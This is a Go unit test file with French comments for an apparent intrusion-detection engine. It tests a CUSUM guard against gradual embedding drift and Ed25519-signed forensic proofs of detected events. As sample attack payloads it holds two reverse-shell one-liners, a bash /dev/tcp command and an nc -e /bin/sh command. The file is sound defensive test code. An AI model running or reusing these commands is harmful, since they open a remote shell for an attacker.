// Package engine — drift_guard_test.go
// Validation unitaire du verrou anti-empoisonnement CUSUM et de la preuve Ed25519.
package engine

import (
	"crypto/ed25519"
	"crypto/rand"
	"path/filepath"
	"testing"
)

func TestDriftGuard_BudgetAndCUSUM(t *testing.T) {
	cfg := DefaultDriftGuardConfig()
	cfg.MaxDriftBudget = 10.0
	cfg.CusumThreshold = 2.0
	cfg.CusumSlack = 0.05
	guard := NewCusumDriftGuard(cfg)

	base := make([]float32, EmbeddingDim)
	for i := range base {
		base[i] = 1.0
	}
	// Initialisation
	if ok, _ := guard.CheckUpdate(base); !ok {
		t.Fatal("L'initialisation de la baseline a échoué")
	}

	// Petits incréments répétés (tentative de grenouille ébouillantée)
	cur := make([]float32, EmbeddingDim)
	copy(cur, base)

	blocked := false
	for step := 1; step <= 50; step++ {
		// Déplacement de +0.02 par dimension
		for i := range cur {
			cur[i] += 0.02
		}
		accepted, reason := guard.CheckUpdate(cur)
		if !accepted {
			blocked = true
			t.Logf("Attaque grenouille ébouillantée interceptée au pas %d: %s", step, reason)
			break
		}
	}

	if !blocked {
		t.Fatal("Le verrou CUSUM n'a pas intercepté la dérive graduelle")
	}
}

func TestForensicProof_Ed25519_SignVerifyAndReplay(t *testing.T) {
	pubKey, privKey, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("Génération de clé Ed25519 échouée: %v", err)
	}

	cb := NewCodebook(nil)
	gz := NewGrayZoneDecider(DefaultGrayZoneConfig())
	cascade := NewCascadeEngine(cb, gz)

	floppyPath := filepath.Join("/devhoros/data/wittgenstein/floppies", "floppy_lolbas.c2book")
	disk, err := LoadFloppyMmap(floppyPath, WittgensteinFloppyKey(FloppyFamilyLOLBAS))
	if err != nil {
		t.Fatalf("Chargement disquette échoué: %v", err)
	}
	defer disk.Close()
	cascade.MountFloppy(1, disk)

	// Événement d'attaque LOLBAS réel
	var ev Probe_event_t
	ev.Ts_ns = 1727629200000000000
	ev.Subsystem = 1
	ev.Action = 1
	copy(ev.Payload[:], "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")

	v := cascade.EvaluateEvent(&ev)

	// 1. Signature de la preuve par l'hôte avec ancrage de la charge utile
	payload := []byte("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")
	proof, err := SignForensicProof(privKey, 10001, &ev, payload, v, disk.Header.FamilyID, disk.Header.CRC32C)
	if err != nil {
		t.Fatalf("SignForensicProof échoué: %v", err)
	}

	// 2. Vérification par le jury contre la clé publique hôte
	if !VerifyForensicProof(pubKey, proof) {
		t.Fatal("VerifyForensicProof a rejeté une preuve authentique")
	}

	// 2b. Rejet immédiat si vérifié contre une mauvaise clé publique
	otherPubKey, _, _ := ed25519.GenerateKey(rand.Reader)
	if VerifyForensicProof(otherPubKey, proof) {
		t.Fatal("VerifyForensicProof a accepté une preuve avec une fausse clé racine")
	}

	// 3. Falsification (altération d'un seul octet dans l'événement)
	tamperedProof := *proof
	tamperedProof.Event.Pid ^= 0xFF
	if VerifyForensicProof(pubKey, &tamperedProof) {
		t.Fatal("VerifyForensicProof a validé une preuve altérée")
	}

	// 4. Rejeu déterministe bit-à-bit par le jury
	reproduced, reason := ReplayForensicProof(pubKey, proof, cascade)
	if !reproduced {
		t.Fatalf("ReplayForensicProof a échoué: %s", reason)
	}
}

// Une clé racine absente ou tronquée ne doit jamais valider une preuve, même
// auto-signée : la vérification ne retombe pas sur la clé déclarée par la preuve.
func TestForensicProof_TrustedKeyMandatory(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	var ev Probe_event_t
	ev.Subsystem, ev.Action = 1, 1
	payload := []byte("nc -e /bin/sh 10.0.0.1 4444")
	copy(ev.Payload[:], payload)
	v := CascadeVerdict{Stage: StageL0, Action: VerdictBlock, ConfidenceQ8: 256}
	proof, err := SignForensicProof(priv, 1, &ev, payload, v, 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	if !VerifyForensicProof(pub, proof) {
		t.Fatal("preuve authentique refusée")
	}
	for name, key := range map[string]ed25519.PublicKey{"nil": nil, "vide": {}, "31 octets": pub[:31]} {
		if VerifyForensicProof(key, proof) {
			t.Fatalf("clé racine %s acceptée", name)
		}
	}
	tampered := *proof
	tampered.Payload = []byte("git status")
	if VerifyForensicProof(pub, &tampered) {
		t.Fatal("charge substituée acceptée malgré PayloadHash")
	}
	if _, err := SignForensicProof(priv, 2, &ev, []byte("autre charge"), v, 0, 0); err == nil {
		t.Fatal("signature d'une charge étrangère à l'événement acceptée")
	}
}
